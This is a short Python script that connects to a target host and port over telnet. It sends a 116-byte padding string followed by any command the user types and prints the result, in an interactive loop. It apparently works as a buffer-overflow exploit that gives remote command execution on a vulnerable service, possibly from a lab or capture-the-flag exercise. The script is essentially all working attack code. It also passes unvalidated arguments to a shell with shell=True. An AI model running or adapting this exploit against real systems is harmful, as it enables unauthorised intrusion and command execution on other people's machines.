import subprocess
import sys
#Thank you Théo Barré for helping me with subprocess

def command_line(command):
    global ip_address, port
    process = subprocess.Popen("telnet " + ip_address + " " + port, shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE, universal_newlines=True, bufsize = 0)
    buf = "X"*116 + command + " \n"
    process.stdin.write(buf)
    res = process.stdout.read()
    start = res.find("for")
    res = res[start + 4 :]
    print(res)
    print("\n")


if __name__ == "__main__":
    run = True
    try :
        ip_address = sys.argv[1]
        port = sys.argv[2]
    except Exception as e :
        print("Arguments problem !")
        print(str(e))
        run = False

    while run :
        command = input(">> ")
        if command == "quit":
            break
        command_line(command)
